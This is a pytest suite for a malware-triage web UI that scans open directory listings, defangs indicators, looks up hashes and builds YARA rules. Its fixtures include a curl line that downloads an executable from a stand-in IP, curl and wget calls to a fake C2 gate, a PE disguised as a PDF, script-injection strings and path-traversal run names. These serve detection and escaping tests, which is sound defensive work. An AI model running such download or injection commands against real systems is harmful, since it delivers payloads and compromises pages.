"""The local triage UI: what a page says when there is little or nothing to show."""

from __future__ import annotations

import re
import time
from pathlib import Path

from fastapi.testclient import TestClient

from dirsift.enrich import MissingKey
from dirsift.models import Entry, Ioc, ScanError, ScanResult, Verdict
from dirsift.web import create_app

BACK_TO_DASHBOARD = re.compile(r'<a[^>]*href="/"[^>]*>(?:(?!</a>).)*Back to Dashboard', re.S)


def save_run(runs_dir: Path, result: ScanResult, name: str = "run") -> str:
    (runs_dir / f"{name}.json").write_text(result.model_dump_json(), encoding="utf-8")
    return name


def header_of(html: str) -> str:
    match = re.search(r"<header[^>]*>(.*?)</header>", html, re.S)
    assert match, "page has no header"
    return match.group(1)


# Empty runs


def test_an_empty_index_says_it_was_read_and_lists_nothing(tmp_path: Path):
    """A server that answers with an empty index is a result, not a broken scan."""
    name = save_run(
        tmp_path,
        ScanResult(
            root_url="http://127.0.0.1:8080/",
            listing_flavor="python",
            title="Directory listing for /",
            requests_made=1,
        ),
    )
    page = TestClient(create_app(tmp_path)).get(f"/runs/{name}")
    assert page.status_code == 200
    assert "the index lists nothing" in page.text


def test_a_run_that_listed_nothing_points_at_its_errors(tmp_path: Path):
    name = save_run(
        tmp_path,
        ScanResult(
            root_url="http://127.0.0.1:8080/",
            errors=[
                ScanError(
                    url="http://127.0.0.1:8080/",
                    stage="walk",
                    detail="ConnectError: [Errno 111] Connection refused",
                )
            ],
        ),
    )
    page = TestClient(create_app(tmp_path)).get(f"/runs/{name}")
    assert "Nothing was listed" in page.text
    assert "the index lists nothing" not in page.text


def test_a_run_with_entries_carries_no_empty_note(tmp_path: Path):
    name = save_run(
        tmp_path,
        ScanResult(
            root_url="http://127.0.0.1:8080/",
            listing_flavor="python",
            entries=[Entry(url="http://127.0.0.1:8080/run.bat", name="run.bat", depth=1)],
        ),
    )
    page = TestClient(create_app(tmp_path)).get(f"/runs/{name}")
    assert "the index lists nothing" not in page.text
    assert "Nothing was listed" not in page.text


# Refused targets


def test_a_refused_private_target_names_the_box_to_tick(tmp_path: Path):
    """The UI has no CLI flag to pass; the message has to point at the form."""
    client = TestClient(create_app(tmp_path))
    started = client.post("/scan", data={"url": "http://127.0.0.1:9/"}, follow_redirects=False)
    status_url = started.headers["location"] + "/status"

    deadline = time.monotonic() + 5
    status = client.get(status_url).text
    while "failed" not in status and time.monotonic() < deadline:
        time.sleep(0.05)
        status = client.get(status_url).text

    assert "failed" in status
    assert "allow private" in status
    assert "--allow-private" not in status
    assert "127.0.0.1" not in status  # targets are defanged in the UI


# Navigation


def test_a_run_page_links_back_to_the_dashboard(tmp_path: Path):
    name = save_run(
        tmp_path, ScanResult(root_url="http://127.0.0.1:8080/", listing_flavor="python")
    )
    page = TestClient(create_app(tmp_path)).get(f"/runs/{name}")
    assert BACK_TO_DASHBOARD.search(page.text)


def test_a_job_page_links_back_to_the_dashboard(tmp_path: Path):
    client = TestClient(create_app(tmp_path))
    started = client.post("/scan", data={"url": "http://127.0.0.1:9/"}, follow_redirects=False)
    page = client.get(started.headers["location"])
    assert BACK_TO_DASHBOARD.search(page.text)


def test_the_dashboard_does_not_link_back_to_itself(tmp_path: Path):
    page = TestClient(create_app(tmp_path)).get("/")
    assert "Back to Dashboard" not in page.text


def test_the_header_names_the_dashboard_and_the_brand_leads_there(tmp_path: Path):
    header = header_of(TestClient(create_app(tmp_path)).get("/").text)
    brand = re.search(r'<a[^>]*class="brand"[^>]*>(?:(?!</a>).)*DIRSIFT', header, re.S)
    assert brand and 'href="/"' in brand.group(0)
    assert re.search(r'<a[^>]*href="/"[^>]*>\s*dashboard\s*</a>', header)
    assert not re.search(r">\s*runs\s*</a>", header)


# Hashes


def run_with_hashes(runs_dir: Path) -> str:
    return save_run(
        runs_dir,
        ScanResult(
            root_url="http://127.0.0.1:8080/",
            listing_flavor="python",
            entries=[
                Entry(
                    url="http://127.0.0.1:8080/run.bat",
                    name="run.bat",
                    depth=1,
                    fetched_bytes=26,
                    sha256="a" * 64,
                    md5="b" * 32,
                ),
                Entry(
                    url="http://127.0.0.1:8080/big.exe",
                    name="big.exe",
                    depth=1,
                    fetched_bytes=16,
                    truncated=True,
                ),
            ],
        ),
    )


def test_hashes_txt_lists_only_the_files_that_were_read_whole(tmp_path: Path):
    name = run_with_hashes(tmp_path)
    body = TestClient(create_app(tmp_path)).get(f"/runs/{name}/hashes.txt").text
    assert "a" * 64 in body
    assert "b" * 32 in body
    assert "run.bat" in body
    assert "big.exe" not in body


def test_the_listing_shows_a_hash_and_says_when_a_read_was_partial(tmp_path: Path):
    name = run_with_hashes(tmp_path)
    page = TestClient(create_app(tmp_path)).get(f"/runs/{name}")
    assert "a" * 12 in page.text  # the short form of the sha256
    assert "partial" in page.text


# The preview panel


def run_with_a_family(runs_dir: Path) -> str:
    """One driver, two versions of the thing it drops, and a lying extension."""
    driver = Entry(
        url="http://127.0.0.1:8080/install.bat",
        name="install.bat",
        depth=1,
        kind="script",
        confidence="sniffed",
        fetched_bytes=120,
        size=120,
        sha256="c" * 64,
        md5="d" * 32,
        head_hex="4020656368",
        text_preview="curl -o svc2.exe http://203.0.113.24/bin/svc2.exe",
        references=["svc2.exe"],
    )
    dropped = Entry(
        url="http://127.0.0.1:8080/svc2.exe",
        name="svc2.exe",
        depth=1,
        kind="pe",
        confidence="sniffed",
        fetched_bytes=4096,
        size=65536,
        truncated=True,
        head_hex="4d5a90000300",
        cluster="svc{n}.exe",
    )
    sibling = Entry(
        url="http://127.0.0.1:8080/svc3.exe",
        name="svc3.exe",
        depth=1,
        kind="pe",
        cluster="svc{n}.exe",
    )
    liar = Entry(
        url="http://127.0.0.1:8080/invoice.pdf",
        name="invoice.pdf",
        depth=1,
        kind="pe",
        confidence="sniffed",
        magic="MZ",
        fetched_bytes=3072,
        size=3072,
        sha256="e" * 64,
        md5="f" * 32,
        head_hex="4d5a9000",
    )
    return save_run(
        runs_dir,
        ScanResult(
            root_url="http://127.0.0.1:8080/",
            listing_flavor="python",
            entries=[driver, dropped, sibling, liar],
            iocs=[
                Ioc(
                    ioc_type="url",
                    value="http://203.0.113.24/bin/svc2.exe",
                    defanged="hxxp://203[.]0[.]113[.]24/bin/svc2[.]exe",
                    source_url="http://127.0.0.1:8080/install.bat",
                ),
                Ioc(
                    ioc_type="ipv4",
                    value="198.51.100.77",
                    defanged="198[.]51[.]100[.]77",
                    source_url="http://127.0.0.1:8080/other.txt",
                ),
            ],
        ),
    )


def preview_of(client: TestClient, name: str, file_url: str) -> str:
    return client.get(f"/runs/{name}/file", params={"url": file_url}).text


def test_the_preview_shows_both_hashes(tmp_path: Path):
    name = run_with_a_family(tmp_path)
    panel = preview_of(TestClient(create_app(tmp_path)), name, "http://127.0.0.1:8080/install.bat")
    assert "c" * 64 in panel
    assert "d" * 32 in panel


def test_the_preview_says_how_much_of_a_cut_file_was_read(tmp_path: Path):
    name = run_with_a_family(tmp_path)
    panel = preview_of(TestClient(create_app(tmp_path)), name, "http://127.0.0.1:8080/svc2.exe")
    assert "partial" in panel.lower()
    assert "4.0K of 64.0K" in panel


def test_the_preview_names_a_lying_extension(tmp_path: Path):
    name = run_with_a_family(tmp_path)
    panel = preview_of(TestClient(create_app(tmp_path)), name, "http://127.0.0.1:8080/invoice.pdf")
    assert "pdf" in panel.lower()
    assert "pe" in panel.lower()


def test_the_preview_lists_only_this_files_indicators(tmp_path: Path):
    name = run_with_a_family(tmp_path)
    panel = preview_of(TestClient(create_app(tmp_path)), name, "http://127.0.0.1:8080/install.bat")
    assert "203[.]0[.]113[.]24" in panel
    assert "198[.]51[.]100[.]77" not in panel


def test_the_preview_links_the_files_that_reference_this_one(tmp_path: Path):
    name = run_with_a_family(tmp_path)
    panel = preview_of(TestClient(create_app(tmp_path)), name, "http://127.0.0.1:8080/svc2.exe")
    assert "install.bat" in panel


def test_the_preview_offers_the_other_versions_in_the_family(tmp_path: Path):
    name = run_with_a_family(tmp_path)
    panel = preview_of(TestClient(create_app(tmp_path)), name, "http://127.0.0.1:8080/svc2.exe")
    assert "svc3.exe" in panel


def test_the_preview_renders_the_first_bytes_as_hex(tmp_path: Path):
    name = run_with_a_family(tmp_path)
    panel = preview_of(TestClient(create_app(tmp_path)), name, "http://127.0.0.1:8080/svc2.exe")
    assert "4d 5a 90 00" in panel
    assert "00000000" in panel  # the offset column


def test_a_run_page_can_open_a_file_straight_from_the_address_bar(tmp_path: Path):
    name = run_with_a_family(tmp_path)
    page = TestClient(create_app(tmp_path)).get(
        f"/runs/{name}", params={"file": "http://127.0.0.1:8080/install.bat"}
    )
    # The md5 appears in the preview panel and nowhere else on the page.
    assert "d" * 32 in page.text


def test_the_dashboard_counts_what_is_saved(tmp_path: Path):
    run_with_a_family(tmp_path)
    page = TestClient(create_app(tmp_path)).get("/")
    assert "files" in page.text
    assert "indicators" in page.text.lower()


def inventory_row(page: str, file_name: str) -> re.Match[str] | None:
    """One row of the file inventory: a list item marked data-row."""
    return re.search(
        r"<li[^>]*data-row[^>]*>(?:(?!</li>).)*" + re.escape(file_name) + r"(?:(?!</li>).)*</li>",
        page,
        re.S,
    )


def test_the_listing_flags_a_lying_extension(tmp_path: Path):
    """invoice.pdf that starts with MZ is the most interesting row in the listing."""
    name = run_with_a_family(tmp_path)
    page = TestClient(create_app(tmp_path)).get(f"/runs/{name}")
    row = inventory_row(page.text, "invoice.pdf")
    assert row, "invoice.pdf is not in the listing"
    assert "mismatch" in row.group(0).lower()


# Reading the contents


def test_the_contents_mark_the_indicators_found_in_them(tmp_path: Path):
    name = run_with_a_family(tmp_path)
    panel = preview_of(TestClient(create_app(tmp_path)), name, "http://127.0.0.1:8080/install.bat")
    assert "<mark" in panel
    assert "203.0.113.24" in panel  # raw inside the evidence, defanged everywhere else


def test_the_contents_are_numbered_line_by_line(tmp_path: Path):
    name = run_with_a_family(tmp_path)
    panel = preview_of(TestClient(create_app(tmp_path)), name, "http://127.0.0.1:8080/install.bat")
    assert 'data-line="1"' in panel


def test_markup_in_a_file_is_shown_not_run(tmp_path: Path):
    """A listing can serve a page full of script tags. They are evidence, not code."""
    name = save_run(
        tmp_path,
        ScanResult(
            root_url="http://127.0.0.1:8080/",
            entries=[
                Entry(
                    url="http://127.0.0.1:8080/panel.php",
                    name="panel.php",
                    depth=1,
                    kind="web",
                    fetched_bytes=40,
                    text_preview="<script>alert(1)</script>",
                )
            ],
        ),
    )
    panel = preview_of(TestClient(create_app(tmp_path)), name, "http://127.0.0.1:8080/panel.php")
    assert "<script>alert(1)</script>" not in panel
    assert "&lt;script&gt;" in panel


# Comparing two versions


def run_with_two_versions(runs_dir: Path) -> str:
    def version(number: int, address: str, digest: str) -> Entry:
        return Entry(
            url=f"http://127.0.0.1:8080/cfg{number}.json",
            name=f"cfg{number}.json",
            depth=1,
            kind="config",
            cluster="cfg{n}.json",
            fetched_bytes=40,
            sha256=digest * 64,
            md5=digest * 32,
            text_preview='{\n  "c2": "' + address + '",\n  "interval": 900\n}',
        )

    return save_run(
        runs_dir,
        ScanResult(
            root_url="http://127.0.0.1:8080/",
            entries=[version(1, "203.0.113.24", "1"), version(2, "198.51.100.77", "3")],
        ),
    )


def test_two_versions_of_a_file_can_be_compared(tmp_path: Path):
    name = run_with_two_versions(tmp_path)
    page = TestClient(create_app(tmp_path)).get(
        f"/runs/{name}/diff",
        params={
            "a": "http://127.0.0.1:8080/cfg1.json",
            "b": "http://127.0.0.1:8080/cfg2.json",
        },
    )
    assert page.status_code == 200
    assert "cfg1.json" in page.text
    assert "cfg2.json" in page.text
    assert "203.0.113.24" in page.text
    assert "198.51.100.77" in page.text


def test_versions_kept_as_bytes_say_why_they_cannot_be_compared(tmp_path: Path):
    name = run_with_a_family(tmp_path)
    page = TestClient(create_app(tmp_path)).get(
        f"/runs/{name}/diff",
        params={
            "a": "http://127.0.0.1:8080/svc2.exe",
            "b": "http://127.0.0.1:8080/svc3.exe",
        },
    )
    assert page.status_code == 200
    assert "svc2.exe" in page.text
    assert "text" in page.text.lower()


# Asking a public scanner about a hash


def stub_lookup(verdict: Verdict | None = None, calls: list | None = None):
    def lookup(sha256: str, **kwargs):
        if calls is not None:
            calls.append(sha256)
        if verdict is None:
            raise MissingKey("no VirusTotal key. Set DIRSIFT_VT_API_KEY in the environment.")
        return verdict
    return lookup


def test_asking_about_a_hash_records_the_answer(tmp_path: Path):
    name = run_with_hashes(tmp_path)
    calls: list[str] = []
    verdict = Verdict(found=True, malicious=6, total=64, analysed="2026-09-01")
    client = TestClient(create_app(tmp_path, lookup=stub_lookup(verdict, calls)))

    panel = client.post(
        f"/runs/{name}/verdict", params={"url": "http://127.0.0.1:8080/run.bat"}
    )

    assert panel.status_code == 200
    assert "6/64" in panel.text
    assert calls == ["a" * 64]
    assert "6/64" in client.get(f"/runs/{name}").text  # written into the saved run


def test_a_file_nobody_has_seen_is_reported_as_such(tmp_path: Path):
    name = run_with_hashes(tmp_path)
    client = TestClient(create_app(tmp_path, lookup=stub_lookup(Verdict(found=False))))
    panel = client.post(
        f"/runs/{name}/verdict", params={"url": "http://127.0.0.1:8080/run.bat"}
    )
    assert "not seen" in panel.text.lower()


def test_without_a_key_the_console_says_how_to_set_one(tmp_path: Path):
    name = run_with_hashes(tmp_path)
    client = TestClient(create_app(tmp_path, lookup=stub_lookup(None)))
    panel = client.post(
        f"/runs/{name}/verdict", params={"url": "http://127.0.0.1:8080/run.bat"}
    )
    assert panel.status_code == 200
    assert "DIRSIFT_VT_API_KEY" in panel.text


# Building a rule from a selection


def test_selected_files_build_a_rule(tmp_path: Path):
    name = run_with_a_family(tmp_path)
    client = TestClient(create_app(tmp_path))
    panel = client.post(
        f"/runs/{name}/yara",
        data={
            "pick": [
                "http://127.0.0.1:8080/install.bat",
                "http://127.0.0.1:8080/svc2.exe",
            ]
        },
    )
    assert panel.status_code == 200
    assert "cyb3rp03t" in panel.text  # the panel escapes the quotes around it
    assert "install.bat" in panel.text
    assert "svc2.exe" in panel.text


def test_a_rule_needs_at_least_one_file(tmp_path: Path):
    name = run_with_a_family(tmp_path)
    panel = TestClient(create_app(tmp_path)).post(f"/runs/{name}/yara", data={})
    assert panel.status_code == 200
    assert "pick" in panel.text.lower()


def test_a_rule_can_be_downloaded_as_a_file(tmp_path: Path):
    name = run_with_a_family(tmp_path)
    reply = TestClient(create_app(tmp_path)).get(
        f"/runs/{name}/rule.yar", params={"pick": "http://127.0.0.1:8080/install.bat"}
    )
    assert reply.status_code == 200
    assert "rule dirsift" in reply.text
    assert 'author = "cyb3rp03t"' in reply.text  # the file itself is not escaped
    assert "attachment" in reply.headers.get("content-disposition", "")


def test_a_hash_can_be_opened_in_the_scanner_without_a_key(tmp_path: Path):
    """No key, no quota, no request from the tool: the browser goes, if asked."""
    name = run_with_hashes(tmp_path)
    panel = preview_of(TestClient(create_app(tmp_path)), name, "http://127.0.0.1:8080/run.bat")
    assert "https://www.virustotal.com/gui/file/" + "a" * 64 in panel


# Asking about a hash you already have


def test_a_pasted_hash_comes_back_with_a_score(tmp_path: Path):
    """A hash often arrives from somewhere else; the console should answer for it."""
    verdict = Verdict(found=True, malicious=21, total=63, analysed="2026-09-16")
    calls: list[str] = []
    client = TestClient(create_app(tmp_path, lookup=stub_lookup(verdict, calls)))

    panel = client.post("/verdict", data={"digest": "1" * 64})

    assert panel.status_code == 200
    assert "21/63" in panel.text
    assert calls == ["1" * 64]


def test_something_that_is_not_a_hash_is_refused_before_anything_is_sent(tmp_path: Path):
    calls: list[str] = []
    client = TestClient(
        create_app(tmp_path, lookup=stub_lookup(Verdict(found=False), calls))
    )

    panel = client.post("/verdict", data={"digest": "not a hash"})

    assert panel.status_code == 200
    assert "sha256" in panel.text.lower()
    assert calls == []  # nothing left the machine


def test_a_pasted_hash_without_a_key_says_how_to_set_one(tmp_path: Path):
    client = TestClient(create_app(tmp_path, lookup=stub_lookup(None)))
    panel = client.post("/verdict", data={"digest": "2" * 64})
    assert "DIRSIFT_VT_API_KEY" in panel.text


# Which network an address belongs to


def run_with_networks(runs_dir: Path) -> str:
    return save_run(
        runs_dir,
        ScanResult(
            root_url="http://203.0.113.24/files/",
            listing_flavor="apache",
            target_ip="203.0.113.24",
            target_asn=64496,
            target_as_name="EXAMPLE-HOSTING",
            target_country="NL",
            asn_source="ip2asn-combined.tsv",
            asn_stamp="2026-09-16",
            entries=[
                Entry(
                    url="http://203.0.113.24/files/config.json",
                    name="config.json",
                    depth=1,
                    fetched_bytes=80,
                    sha256="e" * 64,
                    text_preview='{"gate": "198.51.100.77"}',
                )
            ],
            iocs=[
                Ioc(
                    ioc_type="ipv4",
                    value="198.51.100.77",
                    defanged="198[.]51[.]100[.]77",
                    source_url="http://203.0.113.24/files/config.json",
                    asn=64497,
                    as_name="TEST-NET-HOSTING",
                    country="DE",
                )
            ],
        ),
    )


def test_the_target_card_says_which_network_it_sits_in(tmp_path: Path):
    name = run_with_networks(tmp_path)
    page = TestClient(create_app(tmp_path)).get(f"/runs/{name}").text
    assert "AS64496" in page
    assert "EXAMPLE-HOSTING" in page
    assert "NL" in page
    assert "203[.]0[.]113[.]24" in page  # the address, defanged like every target


def test_an_indicator_carries_its_network(tmp_path: Path):
    name = run_with_networks(tmp_path)
    page = TestClient(create_app(tmp_path)).get(f"/runs/{name}").text
    assert "AS64497" in page
    assert "TEST-NET-HOSTING" in page


def test_the_page_says_which_table_answered(tmp_path: Path):
    """An ASN without a date is a guess, so the page names the dataset."""
    name = run_with_networks(tmp_path)
    page = TestClient(create_app(tmp_path)).get(f"/runs/{name}").text
    assert "ip2asn-combined.tsv" in page
    assert "2026-09-16" in page


# Saying what a note means


def run_with_errors(runs_dir: Path) -> str:
    return save_run(
        runs_dir,
        ScanResult(
            root_url="http://203.0.113.24/files/",
            errors=[
                ScanError(
                    url="http://203.0.113.24/files/",
                    stage="walk",
                    detail="HTTP 503 Service Temporarily Unavailable",
                ),
                ScanError(
                    url="http://203.0.113.24/files/x.bin",
                    stage="peek",
                    detail="HTTP 499 Request has been forbidden by antivirus",
                ),
                ScanError(
                    url="http://203.0.113.24/files/y.bin",
                    stage="peek",
                    detail="a detail nobody has written a sentence for",
                ),
            ],
        ),
    )


def test_a_note_carries_an_explanation_you_can_open(tmp_path: Path):
    name = run_with_errors(tmp_path)
    page = TestClient(create_app(tmp_path)).get(f"/runs/{name}").text
    assert "<details" in page
    assert "what this means" in page.lower()
    assert "already waited and retried" in page


def test_an_antivirus_note_says_the_request_never_arrived(tmp_path: Path):
    name = run_with_errors(tmp_path)
    page = TestClient(create_app(tmp_path)).get(f"/runs/{name}").text
    assert "antivirus answered this request itself" in page


def test_a_note_with_nothing_to_say_gets_no_marker(tmp_path: Path):
    """Three notes, two explanations: the unknown one is left alone."""
    name = run_with_errors(tmp_path)
    page = TestClient(create_app(tmp_path)).get(f"/runs/{name}").text
    assert page.count("what this means") == 2


# An indicator shared between files, and names that are not run names


def test_the_preview_lists_an_indicator_the_file_shares_with_another(tmp_path: Path):
    def build(name: str, verb: str) -> Entry:
        return Entry(
            url="http://203.0.113.24/files/" + name,
            name=name,
            depth=1,
            kind="script",
            fetched_bytes=60,
            text_preview=verb + " http://panel-gate.xyz/gate.php",
        )

    name = save_run(
        tmp_path,
        ScanResult(
            root_url="http://203.0.113.24/files/",
            entries=[build("a.bat", "curl"), build("b.bat", "wget")],
        ),
    )
    client = TestClient(create_app(tmp_path))
    page = preview_of(client, name, "http://203.0.113.24/files/b.bat")
    assert "panel-gate[.]xyz" in page


def test_a_run_name_cannot_climb_out_of_the_runs_folder(tmp_path: Path):
    runs = tmp_path / "runs"
    runs.mkdir()
    save_run(tmp_path, ScanResult(root_url="http://203.0.113.24/secret/"), name="outside")
    client = TestClient(create_app(runs))
    for name in ("..%5Coutside", "%2E%2E%5Coutside", "..%2Foutside"):
        assert client.get(f"/runs/{name}").status_code == 404
        assert client.get(f"/runs/{name}/report.md").status_code == 404


def test_a_refusal_page_escapes_what_it_quotes(tmp_path: Path):
    from dirsift.fetcher import ScopeError

    app = create_app(tmp_path)

    @app.get("/boom")
    def boom():
        raise ScopeError("out of scope: http://x.test/<script>alert(1)</script>")

    page = TestClient(app).get("/boom").text
    # The refusal page now extends base.html, whose own shell carries script
    # tags, so the check is on the quoted address, not any script tag: the
    # listing's markup must come through escaped, never as a live element.
    assert "<script>alert(1)</script>" not in page
    assert "&lt;script&gt;alert(1)&lt;/script&gt;" in page


# The keyboard belongs to the page until the listing has focus

STATIC = Path(__file__).resolve().parents[1] / "src" / "dirsift" / "web" / "static"


def keydown_walker() -> str:
    """The listing walker in dirsift.js, from its comment to the next block."""
    script = (STATIC / "dirsift.js").read_text(encoding="utf-8")
    start = script.index("/* Walk the listing")
    end = script.index("/*", start + 2)
    return script[start:end]


def test_the_listing_rows_carry_the_hook_the_keyboard_walker_reads(tmp_path: Path):
    name = run_with_a_family(tmp_path)
    page = TestClient(create_app(tmp_path)).get(f"/runs/{name}").text
    rows = re.search(r"<div[^>]*data-listing-rows[^>]*>(.*)", page, re.S)
    assert rows, "the listing body is not marked for the keyboard walker"
    assert 'data-file-url="http://127.0.0.1:8080/install.bat"' in rows.group(1)


def test_the_arrow_keys_are_left_alone_outside_the_listing():
    """Arrow keys scroll the page. Only focus inside the listing rows walks them."""
    walker = keydown_walker()
    assert "closest(\"[data-listing-rows]\")" in walker
    # The old walker jumped to the first file from anywhere on the page.
    assert "index === -1 ? 0" not in walker


# The preview as a sheet on a narrow screen


def test_the_preview_sits_in_a_sheet_that_says_how_to_get_back(tmp_path: Path):
    name = run_with_a_family(tmp_path)
    page = TestClient(create_app(tmp_path)).get(f"/runs/{name}").text
    sheet = re.search(r"<div[^>]*data-sheet[^>]*>(.*)", page, re.S)
    assert sheet, "the preview column is not marked as a sheet"
    close = (
        r"<button[^>]*data-sheet-close[^>]*>"
        r"(?:(?!</button>).)*Back to files(?:(?!</button>).)*</button>"
    )
    assert re.search(close, sheet.group(1), re.S)
    assert 'id="preview"' in sheet.group(1)


def test_the_open_file_names_itself_in_a_heading_focus_can_land_on(tmp_path: Path):
    name = run_with_a_family(tmp_path)
    panel = preview_of(TestClient(create_app(tmp_path)), name, "http://127.0.0.1:8080/install.bat")
    heading = re.search(r"<h2[^>]*class=\"preview-name\"[^>]*>(.*?)</h2>", panel, re.S)
    assert heading, "the file name is not a heading"
    assert 'tabindex="-1"' in heading.group(0)
    assert "install.bat" in heading.group(1)


def test_without_script_the_sheet_stays_in_the_page(tmp_path: Path):
    """The sheet only exists once the script has said it runs. A page opened with
    ?file= and no script shows the preview where it is, in the normal flow."""
    page = TestClient(create_app(tmp_path)).get("/").text
    head = page.split("</head>", 1)[0]
    assert 'document.documentElement.classList.add("js")' in head
    css = (STATIC / "dirsift.css").read_text(encoding="utf-8")
    assert ".js .preview-column" in css


# The run page as a case file
#
# The run reads top to bottom as one document: 01 Identity, 02 Drivers, 03
# Inventory, 04 Indicators, 05 Detections, 06 Run settings, with a section menu
# that tracks the reader. Nothing is hidden behind a tab any more, so the old
# ?tab= keys (files, indicators, families, notes, settings) are anchors in the
# page and an old link lands on its part.

RUN_TABS = ("files", "indicators", "families", "notes", "settings")
SECTIONS = ("identity", "drivers", "files", "indicators", "detections", "settings")


def panel_of(page: str, tab: str) -> str:
    match = re.search(rf'<section[^>]*id="{tab}"[^>]*>(.*?)</section>', page, re.S)
    assert match, f"no {tab} section on the page"
    return match.group(0)


def landing(page: str) -> list[str]:
    """The part an old ?tab= link asked for, as the page marks it for the script."""
    return re.findall(r'data-land="(\w+)"', page)


def test_the_run_opens_on_a_summary_strip_with_the_numbers(tmp_path: Path):
    name = run_with_networks(tmp_path)
    page = TestClient(create_app(tmp_path)).get(f"/runs/{name}").text
    strip = re.search(r'<section[^>]*class="run-summary[^"]*"[^>]*>(.*?)</section>', page, re.S)
    assert strip, "no summary strip"
    body = strip.group(1)
    assert re.search(r"<h1[^>]*>\s*hxxp://203\[\.\]0\[\.\]113\[\.\]24/files/\s*</h1>", body)
    for label in ("files", "indicators", "families", "hashed", "requests", "notes"):
        assert re.search(rf"<dt[^>]*>\s*{label}\s*</dt>", body), label
    assert "AS64496" in body
    assert f"/runs/{name}/report.md" in body


def test_a_missing_value_in_the_strip_says_none_not_a_dash(tmp_path: Path):
    name = save_run(tmp_path, ScanResult(root_url="http://127.0.0.1:8080/"))
    page = TestClient(create_app(tmp_path)).get(f"/runs/{name}").text
    strip = re.search(r'<section[^>]*class="run-summary[^"]*"[^>]*>(.*?)</section>', page, re.S)
    assert strip
    assert not re.search(r"<dd[^>]*>\s*-\s*</dd>", strip.group(1))
    assert re.search(r"<dd[^>]*>\s*<span class=\"none\">none</span>\s*</dd>", strip.group(1))


def test_every_part_of_the_run_has_an_anchor_and_a_section(tmp_path: Path):
    """The section menu is a list of anchors, so without the script it still jumps,
    and every old tab key still names a part of the page."""
    name = run_with_a_family(tmp_path)
    page = TestClient(create_app(tmp_path)).get(f"/runs/{name}").text
    nav = re.search(r"<nav[^>]*data-run-sections[^>]*>(.*?)</nav>", page, re.S)
    assert nav, "no section menu"
    for number, section in enumerate(SECTIONS, start=1):
        link = re.search(rf'<a[^>]*href="#{section}"[^>]*>(.*?)</a>', nav.group(1), re.S)
        assert link, section
        assert f"0{number}" in link.group(1), section
        panel_of(page, section)
    for tab in RUN_TABS:
        panel_of(page, tab)
    inventory = re.search(r'<h2[^>]*id="files-title"[^>]*>(.*?)</h2>', page, re.S)
    assert inventory and "4 files" in inventory.group(1)


def test_an_old_tab_link_lands_on_its_part(tmp_path: Path):
    name = run_with_errors(tmp_path)
    client = TestClient(create_app(tmp_path))
    cases = (("notes", ["notes"]), ("families", ["families"]), (None, []), ("nonsense", []))
    for asked, landed in cases:
        params = {"tab": asked} if asked else {}
        page = client.get(f"/runs/{name}", params=params).text
        assert landing(page) == landed, (asked, landing(page))
    # Every part is on the page whatever was asked: nothing is hidden by a tab.
    page = client.get(f"/runs/{name}", params={"tab": "notes"}).text
    assert "run-panel is-current" not in page
    for section in SECTIONS:
        panel_of(page, section)


def test_a_file_in_the_address_bar_opens_the_preview_not_a_section(tmp_path: Path):
    """A shared ?file= link means a preview. Whatever ?tab= rode along, the page
    does not jump to a section under the preview: the preview opens instead."""
    name = run_with_a_family(tmp_path)
    opened = "http://127.0.0.1:8080/install.bat"
    client = TestClient(create_app(tmp_path))
    for asked in ("notes", "indicators", None, "nonsense"):
        params = {"file": opened}
        if asked:
            params["tab"] = asked
        page = client.get(f"/runs/{name}", params=params).text
        assert landing(page) == [], (asked, landing(page))
        sheet = re.search(r"<div[^>]*data-sheet[^>]*>", page)
        assert sheet and "data-sheet-open" in sheet.group(0), asked
        assert "d" * 32 in page
    # Without ?file=, ?tab= still decides where the page lands.
    notes_only = client.get(f"/runs/{name}", params={"tab": "notes"}).text
    assert landing(notes_only) == ["notes"]
    plain = re.search(r"<div[^>]*data-sheet[^>]*>", notes_only)
    assert plain and "data-sheet-open" not in plain.group(0)


def test_the_inventory_and_the_preview_dialog_are_both_on_the_page(tmp_path: Path):
    """The inventory carries the rows; the preview is a dialog outside every
    section, so it floats over the inventory instead of taking its width."""
    name = run_with_a_family(tmp_path)
    page = TestClient(create_app(tmp_path)).get(f"/runs/{name}").text
    files = panel_of(page, "files")
    assert "data-listing-rows" in files
    assert 'id="preview"' not in files
    sheet = re.search(r'<div[^>]*id="preview-sheet"[^>]*>(.*)', page, re.S)
    assert sheet and 'id="preview"' in sheet.group(1)


def test_a_file_opens_from_a_link_that_works_without_script(tmp_path: Path):
    """Each file name is a real link to ?file=, which the server renders with the
    preview in the page, so a reader without the script still gets the file."""
    name = run_with_a_family(tmp_path)
    page = TestClient(create_app(tmp_path)).get(f"/runs/{name}").text
    row = inventory_row(page, "install.bat")
    assert row
    link = re.search(
        r'<a[^>]*data-file-url="http://127.0.0.1:8080/install.bat"[^>]*>', row.group(0)
    )
    assert link, "the file name is not a link"
    href = f'href="/runs/{name}?file=http%3A//127.0.0.1%3A8080/install.bat#preview-sheet"'
    assert href in link.group(0)
    assert "hx-get=" in link.group(0)


def test_the_full_sha256_stays_out_of_the_inventory(tmp_path: Path):
    """The listing used to scroll sideways on the full digest. The row shows the
    short form; the full digest is in the preview."""
    name = run_with_hashes(tmp_path)
    page = TestClient(create_app(tmp_path)).get(f"/runs/{name}").text
    row = inventory_row(page, "run.bat")
    assert row
    assert "a" * 12 in row.group(0)
    assert ">" + "a" * 64 + "<" not in row.group(0)


def test_the_inventory_is_grouped_by_kind(tmp_path: Path):
    name = run_with_a_family(tmp_path)
    page = TestClient(create_app(tmp_path)).get(f"/runs/{name}").text
    files = panel_of(page, "files")
    groups = re.findall(r'<details[^>]*class="grp"[^>]*data-kind="(\w+)"', files)
    assert sorted(groups) == ["pe", "script"]


def test_drivers_ride_on_the_listing_instead_of_a_card(tmp_path: Path):
    name = run_with_a_family(tmp_path)
    page = TestClient(create_app(tmp_path)).get(f"/runs/{name}").text
    assert "What drives the rest" not in page
    strip = re.search(r"<ol[^>]*data-drivers[^>]*>(.*?)</ol>", page, re.S)
    assert strip and "install.bat" in strip.group(1)
    row = inventory_row(page, "install.bat")
    assert row and 'class="driver-badge"' in row.group(0)


def test_the_driver_strip_holds_three_at_most(tmp_path: Path):
    names = [f"stage{n}.bat" for n in range(1, 6)]
    entries = [
        Entry(
            url=f"http://127.0.0.1:8080/{own}",
            name=own,
            depth=1,
            kind="script",
            fetched_bytes=80,
            text_preview="\n".join(f"call {other}" for other in names if other != own),
        )
        for own in names
    ]
    name = save_run(tmp_path, ScanResult(root_url="http://127.0.0.1:8080/", entries=entries))
    page = TestClient(create_app(tmp_path)).get(f"/runs/{name}").text
    strip = re.search(r"<ol[^>]*data-drivers[^>]*>(.*?)</ol>", page, re.S)
    assert strip
